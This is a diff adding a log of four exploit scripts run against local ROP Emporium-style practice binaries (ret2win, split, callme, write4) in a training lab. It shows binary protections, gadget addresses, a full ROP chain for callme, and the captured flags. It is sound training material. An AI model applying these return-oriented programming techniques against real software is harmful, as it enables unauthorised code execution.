@@ -1,0 +1,115 @@
+########## exploit_ret2win.py ##########
+[*] '/root/techlabs/verify-pwn-b/6.4/ret2win'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+    Debuginfo:  Yes
+[x] Starting local process './ret2win'
+[+] Starting local process './ret2win': pid 428936
+[*] Loading gadgets for '/root/techlabs/verify-pwn-b/6.4/ret2win'
+[*] ret gadget   = 0x40101a
+[*] ret2win()    = 0x401166
+[x] Receiving all data
+[x] Receiving all data: 1B
+[x] Receiving all data: 19B
+[x] Receiving all data: 63B
+[+] Receiving all data: Done (63B)
+[*] Stopped process './ret2win' (pid 428936)
+ ret2win() called:
+FLAG{rop_emporium_local_equivalent_p6_2026}
+
+[+] ret2win OK: da in flag
+
+########## exploit_split.py ##########
+[*] '/root/techlabs/verify-pwn-b/6.4/split'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+    Debuginfo:  Yes
+[x] Starting local process './split'
+[+] Starting local process './split': pid 428999
+[*] Loading gadgets for '/root/techlabs/verify-pwn-b/6.4/split'
+[*] pop rdi ; ret = 0x40116c
+[*] usefulString  = 0x404030
+[*] system@plt     = 0x401030
+[x] Receiving all data
+[x] Receiving all data: 1B
+[x] Receiving all data: 45B
+[+] Receiving all data: Done (45B)
+[*] Stopped process './split' (pid 428999)
+ FLAG{rop_emporium_local_equivalent_p6_2026}
+
+[+] split OK: da in flag
+
+########## exploit_callme.py ##########
+[*] '/root/techlabs/verify-pwn-b/6.4/callme'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+    Debuginfo:  Yes
+[x] Starting local process './callme'
+[+] Starting local process './callme': pid 431660
+[*] Loaded 8 cached gadgets for './callme'
+[*] 
+    0x0000:         0x401301 pop rdi; pop rsi; pop rdx; ret
+    0x0008: 0xdeadbeefdeadbeef [arg0] rdi = 16045690984833335023
+    0x0010: 0xcafebabecafebabe [arg1] rsi = 14627333968358193854
+    0x0018: 0xd00df00dd00df00d [arg2] rdx = 14991902676702064653
+    0x0020:         0x401176 callme_one
+    0x0028:         0x401301 pop rdi; pop rsi; pop rdx; ret
+    0x0030: 0xdeadbeefdeadbeef [arg0] rdi = 16045690984833335023
+    0x0038: 0xcafebabecafebabe [arg1] rsi = 14627333968358193854
+    0x0040: 0xd00df00dd00df00d [arg2] rdx = 14991902676702064653
+    0x0048:         0x4011f1 callme_two
+    0x0050:         0x401301 pop rdi; pop rsi; pop rdx; ret
+    0x0058: 0xdeadbeefdeadbeef [arg0] rdi = 16045690984833335023
+    0x0060: 0xcafebabecafebabe [arg1] rsi = 14627333968358193854
+    0x0068: 0xd00df00dd00df00d [arg2] rdx = 14991902676702064653
+    0x0070:         0x401277 callme_three
+[x] Receiving all data
+[x] Receiving all data: 1B
+[x] Receiving all data: 52B
+[x] Receiving all data: 96B
+[+] Receiving all data: Done (96B)
+[*] Stopped process './callme' (pid 431660)
+ callme_one OK
+callme_two OK
+callme_three OK, flag:
+FLAG{rop_emporium_local_equivalent_p6_2026}
+
+[+] callme OK: da in flag
+
+########## exploit_write4.py ##########
+[*] '/root/techlabs/verify-pwn-b/6.4/write4'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+    Debuginfo:  Yes
+[x] Starting local process './write4'
+[+] Starting local process './write4': pid 429038
+[*] Loading gadgets for '/root/techlabs/verify-pwn-b/6.4/write4'
+[*] pop rdi            = 0x401201
+[*] pop r14 ; pop r15  = 0x401203
+[*] mov [r14], r15     = 0x401208
+[*] .bss data          = 0x404150
+[x] Receiving all data
+[x] Receiving all data: 1B
+[x] Receiving all data: 45B
+[+] Receiving all data: Done (45B)
+[*] Stopped process './write4' (pid 429038)
+ FLAG{rop_emporium_local_equivalent_p6_2026}
+
+[+] write4 OK: da in flag
+
